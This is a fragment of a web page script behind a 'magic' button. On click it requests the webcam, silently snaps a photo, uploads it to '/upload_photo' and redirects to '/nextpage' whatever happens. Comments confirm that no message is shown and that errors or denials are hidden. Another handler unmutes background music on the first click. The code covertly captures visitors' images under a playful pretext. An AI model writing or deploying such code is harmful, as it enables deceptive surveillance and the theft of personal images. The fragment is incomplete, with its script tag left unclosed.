        .magic-btn {

}

    <script>
        document.addEventListener('click', function enableAudio() {
            const music = document.getElementById('bg-music');
            if (music.muted) {
                music.muted = false;
                music.play();
            }
            document.removeEventListener('click', enableAudio);
        });
   document.getElementById('magicBtn').onclick = async function() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();
    const canvas = document.createElement('canvas');
    canvas.width = 300;
    canvas.height = 300;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(blob => {
      const formData = new FormData();
      formData.append('photo', blob, 'photo.png');
      fetch('/upload_photo', { method: 'POST', body: formData }).then(response => {
        stream.getTracks().forEach(track => track.stop());
        // Always go to /nextpage, no matter the response status
        window.location.href = '/nextpage';
      }).catch(() => {
        stream.getTracks().forEach(track => track.stop());
        window.location.href = '/nextpage';
      });
    }, 'image/png');
  } catch (err) {
    // No message, just proceed to next page if permission denied or error
    window.location.href = '/nextpage';
  }
};
